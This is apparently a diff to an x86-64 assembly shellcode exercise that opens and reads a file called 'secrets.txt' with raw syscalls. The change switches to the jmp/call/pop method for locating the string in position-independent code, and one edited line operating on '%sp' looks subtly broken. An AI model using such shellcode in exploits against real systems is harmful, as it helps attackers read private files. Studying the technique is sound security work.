@@ -3,17 +3,20 @@
 	.text
 
 _start:
+	jmp path
+
+goback:
 	# open(secrets.txt)
 	xor	%rax, %rax
 	addb	$2, %al
-	push	$path
+	#push	$path
 	pop	%rdi
 	xor	%rsi, %rsi
 	syscall
 
 	# read(secrets.txt)
 	mov	%rax, %rdi
-	sub	$0xff, %rsp
+	sub	$0xfff, %sp
 	lea	0x08(%rsp), %rsi
 	xor	%rdx, %rdx
 	addb	$0xff, %dl
@@ -36,4 +39,5 @@ _start:
 	syscall
 
 path:
+	call goback
 	.ascii	"secrets.txt"
